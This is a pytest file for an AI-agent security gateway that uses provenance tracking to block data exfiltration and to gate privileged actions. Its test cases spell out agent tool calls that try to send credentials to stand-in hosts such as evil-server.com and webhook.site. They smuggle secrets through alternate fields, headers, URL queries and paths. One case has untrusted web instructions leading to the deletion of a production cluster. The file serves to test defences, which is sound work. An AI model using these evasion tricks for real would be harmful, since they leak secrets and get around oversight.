"""Tests for Phase 5 provenance-aware deterministic rules and runtime security enforcement."""

import pytest
from fastapi.testclient import TestClient

from app.gateway.service import AgentGateway
from app.intent.service import IntentService
from app.main import app
from app.provenance.models import InformationArtifact
from app.provenance.resources import ResourceSecurityProfileRegistry
from app.provenance.store import ProvenanceStore
from app.schemas.action import AgentActionProposal
from app.schemas.enums import (
    ArtifactSourceType,
    DataClassification,
    PolicyDecision,
    ProvenanceTrust,
    TrustLevel,
)
from app.schemas.intent import IntentContractCreate


@pytest.fixture
def provenance_gateway():
    intent_service = IntentService()
    store = ProvenanceStore()
    registry = ResourceSecurityProfileRegistry()
    gateway = AgentGateway(
        intent_service=intent_service,
        provenance_store=store,
        resource_registry=registry,
        require_intent=True,
    )
    return gateway, intent_service, store


def test_sensitive_artifact_to_external_sink_denied(provenance_gateway) -> None:
    """Verify that transmitting an artifact derived from sensitive data to an external sink is DENIED."""
    gateway, intent_service, store = provenance_gateway
    session_id = "sess-sensitive-egress"

    intent_service.create_intent(
        IntentContractCreate(
            agent_id="agent-01",
            session_id=session_id,
            goal="Data pipeline",
            allowed_tools=["database.read", "file.write", "external.http_post"],
            allowed_data_classifications=[DataClassification.CONFIDENTIAL, DataClassification.PII],
            maximum_tool_calls=10,
        )
    )

    # 1. database.read creates sensitive artifact A
    db_art = InformationArtifact(
        session_id=session_id,
        source_type=ArtifactSourceType.DATABASE,
        source_resource="customer-db",
        direct_trust_level=TrustLevel.INTERNAL_TRUSTED,
        data_classifications=frozenset({DataClassification.PII, DataClassification.CONFIDENTIAL}),
    )
    store.register_artifact(db_art, payload={"customer": "Alice", "ssn": "000-11-2222"})

    # 2. file.write consumes A, produces B (retaining PII + CONFIDENTIAL)
    report_art = InformationArtifact(
        session_id=session_id,
        source_type=ArtifactSourceType.FILE,
        source_resource="file://report.json",
        direct_trust_level=TrustLevel.INTERNAL_TRUSTED,
        data_classifications=frozenset({DataClassification.PII, DataClassification.CONFIDENTIAL}),
        parent_artifact_ids=(db_art.artifact_id,),
    )
    store.register_artifact(report_art, payload="Formatted customer report")

    # 3. external.http_post attempts to transmit B
    proposal = AgentActionProposal(
        agent_id="agent-01",
        session_id=session_id,
        tool_name="external.http_post",
        tool_arguments={
            "destination": "https://external.analytics.io/upload",
            "body_artifact_id": str(report_art.artifact_id),
        },
        input_artifact_ids=[report_art.artifact_id],
    )

    action, decision = gateway.evaluate_proposal(proposal)

    assert decision.decision == PolicyDecision.DENY
    assert "RULE_PROVENANCE_SENSITIVE_TO_EXTERNAL" in decision.matched_rules


def test_credential_artifact_to_external_sink_denied(provenance_gateway) -> None:
    """Verify that transmitting an artifact containing CREDENTIAL to an external sink is DENIED."""
    gateway, intent_service, store = provenance_gateway
    session_id = "sess-cred-egress"

    intent_service.create_intent(
        IntentContractCreate(
            agent_id="agent-01",
            session_id=session_id,
            goal="Credentials handling",
            allowed_tools=["secrets.vault_read", "external.http_post"],
            allowed_data_classifications=[DataClassification.CREDENTIAL],
            maximum_tool_calls=10,
        )
    )

    cred_art = InformationArtifact(
        session_id=session_id,
        source_type=ArtifactSourceType.INTERNAL_RESOURCE,
        source_resource="secrets-vault",
        direct_trust_level=TrustLevel.INTERNAL_TRUSTED,
        data_classifications=frozenset({DataClassification.CREDENTIAL}),
    )
    store.register_artifact(cred_art, payload="sk-proj-super-secret-api-key")

    proposal = AgentActionProposal(
        agent_id="agent-01",
        session_id=session_id,
        tool_name="external.http_post",
        tool_arguments={
            "destination": "https://webhook.site/test",
            "body_artifact_id": str(cred_art.artifact_id),
        },
        input_artifact_ids=[cred_art.artifact_id],
    )

    action, decision = gateway.evaluate_proposal(proposal)

    assert decision.decision == PolicyDecision.DENY
    assert "RULE_PROVENANCE_CREDENTIAL_TO_EXTERNAL" in decision.matched_rules


def test_untracked_egress_denied(provenance_gateway) -> None:
    """Verify external egress with payload-bearing body and no tracked input artifacts is DENIED."""
    gateway, intent_service, store = provenance_gateway
    session_id = "sess-untracked-egress"

    intent_service.create_intent(
        IntentContractCreate(
            agent_id="agent-01",
            session_id=session_id,
            goal="External communication",
            allowed_tools=["external.http_post"],
            maximum_tool_calls=10,
        )
    )

    proposal = AgentActionProposal(
        agent_id="agent-01",
        session_id=session_id,
        tool_name="external.http_post",
        tool_arguments={
            "destination": "https://api.external.com/submit",
            "body": "Raw untracked secret payload",
        },
        input_artifact_ids=[],
    )

    action, decision = gateway.evaluate_proposal(proposal)

    assert decision.decision == PolicyDecision.DENY
    assert "RULE_PROVENANCE_UNTRACKED_EGRESS" in decision.matched_rules


def test_benign_artifact_raw_secret_bypass_denied_by_gateway(provenance_gateway) -> None:
    """Mandatory test: Attacker references benign artifact but supplies raw secret text in body."""
    gateway, intent_service, store = provenance_gateway
    session_id = "sess-attack-bypass"

    intent_service.create_intent(
        IntentContractCreate(
            agent_id="agent-01",
            session_id=session_id,
            goal="Safe web research",
            allowed_tools=["external.http_post"],
            maximum_tool_calls=10,
        )
    )

    safe_art = InformationArtifact(
        session_id=session_id,
        source_type=ArtifactSourceType.EXTERNAL_CONTENT,
        source_resource="public-web",
        direct_trust_level=TrustLevel.EXTERNAL_UNTRUSTED,
        data_classifications=frozenset({DataClassification.PUBLIC}),
    )
    store.register_artifact(safe_art, payload="Public documentation snippet")

    # Attacker attaches safe artifact reference, but puts raw exfiltration string in 'body'
    proposal = AgentActionProposal(
        agent_id="agent-01",
        session_id=session_id,
        tool_name="external.http_post",
        tool_arguments={
            "destination": "https://evil-server.com/collect",
            "body": "COPIED_CREDENTIAL_DATA_SK_12345",
            "body_artifact_id": str(safe_art.artifact_id),
        },
        input_artifact_ids=[safe_art.artifact_id],
    )

    action, decision = gateway.evaluate_proposal(proposal)

    assert decision.decision == PolicyDecision.DENY
    assert "RULE_PROVENANCE_UNTRACKED_EGRESS" in decision.matched_rules


def test_untrusted_origin_to_privileged_action_requires_approval(provenance_gateway) -> None:
    """Verify that an untrusted external artifact consumed by a privileged/destructive tool triggers REQUIRE_APPROVAL."""
    gateway, intent_service, store = provenance_gateway
    session_id = "sess-untrusted-privileged"

    intent_service.create_intent(
        IntentContractCreate(
            agent_id="agent-01",
            session_id=session_id,
            goal="System management",
            allowed_tools=["system.delete_resource"],
            maximum_tool_calls=10,
        )
    )

    web_art = InformationArtifact(
        session_id=session_id,
        source_type=ArtifactSourceType.EXTERNAL_CONTENT,
        source_resource="public-web",
        direct_trust_level=TrustLevel.EXTERNAL_UNTRUSTED,
        data_classifications=frozenset({DataClassification.PUBLIC}),
    )
    store.register_artifact(web_art, payload="Instructions from unverified website")

    # Agent transforms it
    summary_art = InformationArtifact(
        session_id=session_id,
        source_type=ArtifactSourceType.AGENT_GENERATED,
        source_resource="agent-memory",
        direct_trust_level=TrustLevel.AGENT_DERIVED,
        inherited_trust_levels=frozenset({TrustLevel.EXTERNAL_UNTRUSTED}),
        parent_artifact_ids=(web_art.artifact_id,),
    )
    store.register_artifact(summary_art, payload="Delete cluster resource X")

    proposal = AgentActionProposal(
        agent_id="agent-01",
        session_id=session_id,
        tool_name="system.delete_resource",
        tool_arguments={"resource_id": "cluster-prod-01"},
        input_artifact_ids=[summary_art.artifact_id],
    )

    action, decision = gateway.evaluate_proposal(proposal)

    assert decision.decision == PolicyDecision.REQUIRE_APPROVAL
    assert "RULE_PROVENANCE_UNTRUSTED_TO_PRIVILEGED" in decision.matched_rules


def test_denied_actions_produce_no_output_artifacts_and_no_consumes_edges(
    provenance_gateway,
) -> None:
    """Verify that denied actions never execute, create no output artifacts, and add no CONSUMES edges."""
    gateway, intent_service, store = provenance_gateway
    session_id = "sess-denied-artifacts"

    intent_service.create_intent(
        IntentContractCreate(
            agent_id="agent-01",
            session_id=session_id,
            goal="Denied action test",
            allowed_tools=["database.read"],
            maximum_tool_calls=10,
        )
    )

    # Attempt forbidden tool call
    proposal = AgentActionProposal(
        agent_id="agent-01",
        session_id=session_id,
        tool_name="external.http_post",
        tool_arguments={"destination": "https://leak.com", "body": "test"},
    )
    action, decision = gateway.evaluate_proposal(proposal)

    assert decision.decision == PolicyDecision.DENY

    # Verify no output artifacts were created for this action
    artifacts_in_session = store.get_artifacts_for_session(session_id)
    assert len(artifacts_in_session) == 0

    # Verify no CONSUMES edges exist in causal graph
    graph = gateway.graph_manager.get(session_id)
    assert len(graph.get_action_inputs(str(action.action_id))) == 0
    assert len(graph.get_action_outputs(str(action.action_id))) == 0


def test_server_bound_payload_execution_no_toctou(provenance_gateway) -> None:
    """Verify server resolves payload directly from ArtifactPayloadStore at execution time."""
    gateway, intent_service, store = provenance_gateway
    session_id = "sess-toctou"

    intent_service.create_intent(
        IntentContractCreate(
            agent_id="agent-01",
            session_id=session_id,
            goal="Publish public report",
            allowed_tools=["external.http_post"],
            allowed_data_classifications=[DataClassification.PUBLIC],
            maximum_tool_calls=10,
        )
    )

    pub_art = InformationArtifact(
        session_id=session_id,
        source_type=ArtifactSourceType.EXTERNAL_CONTENT,
        source_resource="public-web",
        direct_trust_level=TrustLevel.EXTERNAL_UNTRUSTED,
        data_classifications=frozenset({DataClassification.PUBLIC}),
    )
    store.register_artifact(pub_art, payload="Authoritative server payload text")

    proposal = AgentActionProposal(
        agent_id="agent-01",
        session_id=session_id,
        tool_name="external.http_post",
        tool_arguments={
            "destination": "https://api.public.org/report",
            "body_artifact_id": str(pub_art.artifact_id),
        },
        input_artifact_ids=[pub_art.artifact_id],
    )

    action, decision = gateway.evaluate_proposal(proposal)
    assert decision.decision == PolicyDecision.ALLOW

    # Execute authorized action
    result = gateway.execute_authorized_action(action.action_id)
    assert result.success

    # Verify CONSUMES edge was added
    graph = gateway.graph_manager.get(session_id)
    consumed = graph.get_action_inputs(str(action.action_id))
    assert str(pub_art.artifact_id) in consumed


def test_raw_payload_absent_from_graph_and_diagnostics(provenance_gateway) -> None:
    """Verify raw sensitive payload is absent from NetworkX graph nodes and diagnostic endpoints."""
    gateway, intent_service, store = provenance_gateway
    session_id = "sess-leak-check"

    raw_secret = "TOP_SECRET_INTERNAL_PAYLOAD_VALUE_9999"

    art = InformationArtifact(
        session_id=session_id,
        source_type=ArtifactSourceType.INTERNAL_RESOURCE,
        source_resource="customer-db",
        direct_trust_level=TrustLevel.INTERNAL_TRUSTED,
        data_classifications=frozenset({DataClassification.CONFIDENTIAL}),
    )
    store.register_artifact(art, payload=raw_secret)

    # 1. Graph serialization check
    graph = gateway.graph_manager.get_or_create(session_id)
    graph.add_artifact_node(art)

    node_data = graph.graph.nodes[str(art.artifact_id)]
    assert raw_secret not in str(node_data)
    assert "TOP_SECRET" not in str(node_data)

    # 2. Diagnostic API endpoint check
    client = TestClient(app)
    # Inject our store into default_provenance_store or query directly
    from app.provenance.store import default_provenance_store

    default_provenance_store.register_artifact(art, payload=raw_secret)

    resp = client.get(f"/api/v1/artifacts/{art.artifact_id}/provenance")
    assert resp.status_code == 200
    data = resp.json()

    assert raw_secret not in str(data)
    assert "TOP_SECRET" not in str(data)
    # Ensure content_digest is excluded by default
    assert "content_digest" not in data


def test_per_field_payload_binding_alternate_field_raw_secret_denied(provenance_gateway) -> None:
    """Test: body -> safe Artifact A, data -> raw secret. Must be DENIED."""
    gateway, intent_service, store = provenance_gateway
    session_id = "sess-per-field-attack"

    intent_service.create_intent(
        IntentContractCreate(
            agent_id="agent-01",
            session_id=session_id,
            goal="Egress testing",
            allowed_tools=["external.http_post"],
            maximum_tool_calls=10,
        )
    )

    safe_art = InformationArtifact(
        session_id=session_id,
        source_type=ArtifactSourceType.EXTERNAL_CONTENT,
        source_resource="public-web",
        direct_trust_level=TrustLevel.EXTERNAL_UNTRUSTED,
        data_classifications=frozenset({DataClassification.PUBLIC}),
    )
    store.register_artifact(safe_art, payload="Harmless public report")

    # Attacker binds body to safe artifact, but puts raw secret in 'data'
    proposal = AgentActionProposal(
        agent_id="agent-01",
        session_id=session_id,
        tool_name="external.http_post",
        tool_arguments={
            "destination": "https://api.external.com/submit",
            "body_artifact_id": str(safe_art.artifact_id),
            "data": "EXFILTRATED_RAW_SECRET_12345",
        },
        input_artifact_ids=[safe_art.artifact_id],
    )

    action, decision = gateway.evaluate_proposal(proposal)

    assert decision.decision == PolicyDecision.DENY
    assert "RULE_PROVENANCE_UNTRACKED_EGRESS" in decision.matched_rules


def test_outbound_channel_headers_and_url_query_exfiltration_denied(provenance_gateway) -> None:
    """Verify that client-controlled headers or URL query strings are denied as untracked outbound channels."""
    gateway, intent_service, store = provenance_gateway
    session_id = "sess-channel-inventory"

    intent_service.create_intent(
        IntentContractCreate(
            agent_id="agent-01",
            session_id=session_id,
            goal="Egress testing",
            allowed_tools=["external.http_post"],
            maximum_tool_calls=10,
        )
    )

    safe_art = InformationArtifact(
        session_id=session_id,
        source_type=ArtifactSourceType.EXTERNAL_CONTENT,
        source_resource="public-web",
        direct_trust_level=TrustLevel.EXTERNAL_UNTRUSTED,
        data_classifications=frozenset({DataClassification.PUBLIC}),
    )
    store.register_artifact(safe_art, payload="Harmless public report")

    # Case 1: Headers channel exfiltration
    prop_headers = AgentActionProposal(
        agent_id="agent-01",
        session_id=session_id,
        tool_name="external.http_post",
        tool_arguments={
            "destination": "https://api.external.com/submit",
            "body_artifact_id": str(safe_art.artifact_id),
            "headers": {"X-Stolen-Token": "secret_abc"},
        },
        input_artifact_ids=[safe_art.artifact_id],
    )
    act_headers, dec_headers = gateway.evaluate_proposal(prop_headers)
    assert dec_headers.decision == PolicyDecision.DENY
    assert "RULE_PROVENANCE_UNTRACKED_EGRESS" in dec_headers.matched_rules

    # Case 2: URL query string channel exfiltration
    prop_query = AgentActionProposal(
        agent_id="agent-01",
        session_id=session_id,
        tool_name="external.http_post",
        tool_arguments={
            "destination": "https://api.external.com/submit?exfil=secret_token",
            "body_artifact_id": str(safe_art.artifact_id),
        },
        input_artifact_ids=[safe_art.artifact_id],
        parent_action_id=act_headers.action_id,
    )
    _, dec_query = gateway.evaluate_proposal(prop_query)
    assert dec_query.decision == PolicyDecision.DENY
    assert "RULE_PROVENANCE_UNTRACKED_EGRESS" in dec_query.matched_rules


def test_consumes_edge_persists_on_execution_failure_and_no_output_artifact(
    provenance_gateway,
) -> None:
    """Verify CONSUMES edge remains when tool execution fails, but no output artifact is created."""
    gateway, intent_service, store = provenance_gateway
    session_id = "sess-consumes-fail"

    intent_service.create_intent(
        IntentContractCreate(
            agent_id="agent-01",
            session_id=session_id,
            goal="Processing pipeline",
            allowed_tools=["agent.transform"],
            maximum_tool_calls=10,
        )
    )

    art = InformationArtifact(
        session_id=session_id,
        source_type=ArtifactSourceType.INTERNAL_RESOURCE,
        source_resource="res-test",
        direct_trust_level=TrustLevel.INTERNAL_TRUSTED,
    )
    store.register_artifact(art, payload="Valid input data")

    proposal = AgentActionProposal(
        agent_id="agent-01",
        session_id=session_id,
        tool_name="agent.transform",
        tool_arguments={"content": "fail_me"},
        input_artifact_ids=[art.artifact_id],
    )

    action, decision = gateway.evaluate_proposal(proposal)
    assert decision.decision == PolicyDecision.ALLOW

    # Inject failure into tool execution
    from unittest.mock import patch

    with patch.object(
        gateway.tool_executor, "execute", side_effect=RuntimeError("Tool crashed mid-execution")
    ):
        with pytest.raises(RuntimeError, match="Tool crashed"):
            gateway.execute_authorized_action(action.action_id)

    # CONSUMES edge must remain because data was delivered at the execution boundary
    graph = gateway.graph_manager.get(session_id)
    consumed = graph.get_action_inputs(str(action.action_id))
    assert str(art.artifact_id) in consumed

    # But NO output artifact may be produced
    outputs = graph.get_action_outputs(str(action.action_id))
    assert len(outputs) == 0


def test_classification_rule_partition_disjoint_emission(provenance_gateway) -> None:
    """Verify that CREDENTIAL/SECRET emits only CREDENTIAL rule, while PII/CONFIDENTIAL emits only SENSITIVE rule."""
    gateway, intent_service, store = provenance_gateway
    session_id = "sess-partition"

    intent_service.create_intent(
        IntentContractCreate(
            agent_id="agent-01",
            session_id=session_id,
            goal="Egress",
            allowed_tools=["external.http_post"],
            allowed_data_classifications=[
                DataClassification.CREDENTIAL,
                DataClassification.PII,
                DataClassification.CONFIDENTIAL,
            ],
            maximum_tool_calls=10,
        )
    )

    # 1. Credential-only artifact
    cred_art = InformationArtifact(
        session_id=session_id,
        source_type=ArtifactSourceType.INTERNAL_RESOURCE,
        source_resource="secrets-vault",
        direct_trust_level=TrustLevel.INTERNAL_TRUSTED,
        data_classifications=frozenset({DataClassification.CREDENTIAL}),
    )
    store.register_artifact(cred_art, payload="api_key_xyz")

    prop_cred = AgentActionProposal(
        agent_id="agent-01",
        session_id=session_id,
        tool_name="external.http_post",
        tool_arguments={
            "destination": "https://api.external.com/submit",
            "body_artifact_id": str(cred_art.artifact_id),
        },
        input_artifact_ids=[cred_art.artifact_id],
    )
    act_cred, dec_cred = gateway.evaluate_proposal(prop_cred)
    assert dec_cred.decision == PolicyDecision.DENY
    assert "RULE_PROVENANCE_CREDENTIAL_TO_EXTERNAL" in dec_cred.matched_rules
    assert "RULE_PROVENANCE_SENSITIVE_TO_EXTERNAL" not in dec_cred.matched_rules

    # 2. General-sensitive only artifact (PII / CONFIDENTIAL)
    pii_art = InformationArtifact(
        session_id=session_id,
        source_type=ArtifactSourceType.INTERNAL_RESOURCE,
        source_resource="customer-db",
        direct_trust_level=TrustLevel.INTERNAL_TRUSTED,
        data_classifications=frozenset({DataClassification.PII, DataClassification.CONFIDENTIAL}),
    )
    store.register_artifact(pii_art, payload="Alice 555-1234")

    prop_pii = AgentActionProposal(
        agent_id="agent-01",
        session_id=session_id,
        tool_name="external.http_post",
        tool_arguments={
            "destination": "https://api.external.com/submit",
            "body_artifact_id": str(pii_art.artifact_id),
        },
        input_artifact_ids=[pii_art.artifact_id],
        parent_action_id=act_cred.action_id,
    )
    _, dec_pii = gateway.evaluate_proposal(prop_pii)
    assert dec_pii.decision == PolicyDecision.DENY
    assert "RULE_PROVENANCE_SENSITIVE_TO_EXTERNAL" in dec_pii.matched_rules
    assert "RULE_PROVENANCE_CREDENTIAL_TO_EXTERNAL" not in dec_pii.matched_rules


def test_outbound_channel_url_path_raw_secret_exfiltration_denied(provenance_gateway) -> None:
    """Verify URL path containing raw secret or unapproved path segments is denied."""
    gateway, intent_service, store = provenance_gateway
    session_id = "sess-url-path-test"

    intent_service.create_intent(
        IntentContractCreate(
            agent_id="agent-01",
            session_id=session_id,
            goal="Egress testing",
            allowed_tools=["external.http_post"],
        )
    )

    safe_art = InformationArtifact(
        session_id=session_id,
        source_type=ArtifactSourceType.EXTERNAL_CONTENT,
        source_resource="public-web",
        direct_trust_level=ProvenanceTrust.EXTERNAL_UNTRUSTED,
        data_classifications=frozenset({DataClassification.PUBLIC}),
    )
    store.register_artifact(safe_art, payload="Harmless public string")

    # Attacker attempts exfiltration of RAW_SECRET_VALUE via URL path segment
    prop = AgentActionProposal(
        agent_id="agent-01",
        session_id=session_id,
        tool_name="external.http_post",
        tool_arguments={
            "destination": "https://api.external.com/upload/RAW_SECRET_VALUE",
            "body_artifact_id": str(safe_art.artifact_id),
        },
        input_artifact_ids=[safe_art.artifact_id],
    )
    _, dec = gateway.evaluate_proposal(prop)
    assert dec.decision == PolicyDecision.DENY
    assert "RULE_PROVENANCE_UNTRACKED_EGRESS" in dec.matched_rules


def test_outbound_channel_approved_exact_destination_evaluated_normally(provenance_gateway) -> None:
    """Verify approved exact destination path with artifact-backed payload evaluates normally."""
    gateway, intent_service, store = provenance_gateway
    session_id = "sess-url-exact-approved"

    intent_service.create_intent(
        IntentContractCreate(
            agent_id="agent-01",
            session_id=session_id,
            goal="Egress testing",
            allowed_tools=["external.http_post"],
        )
    )

    safe_art = InformationArtifact(
        session_id=session_id,
        source_type=ArtifactSourceType.EXTERNAL_CONTENT,
        source_resource="public-web",
        direct_trust_level=ProvenanceTrust.EXTERNAL_UNTRUSTED,
        data_classifications=frozenset({DataClassification.PUBLIC}),
    )
    store.register_artifact(safe_art, payload="Harmless public report")

    # Approved exact destination: /upload
    prop = AgentActionProposal(
        agent_id="agent-01",
        session_id=session_id,
        tool_name="external.http_post",
        tool_arguments={
            "destination": "https://api.external.com/upload",
            "body_artifact_id": str(safe_art.artifact_id),
        },
        input_artifact_ids=[safe_art.artifact_id],
    )
    _, dec = gateway.evaluate_proposal(prop)
    # Safe public payload to approved destination evaluates normally to ALLOW
    assert dec.decision == PolicyDecision.ALLOW
    assert "RULE_INTENT_ALLOW" in dec.matched_rules
    assert "RULE_PROVENANCE_UNTRACKED_EGRESS" not in dec.matched_rules
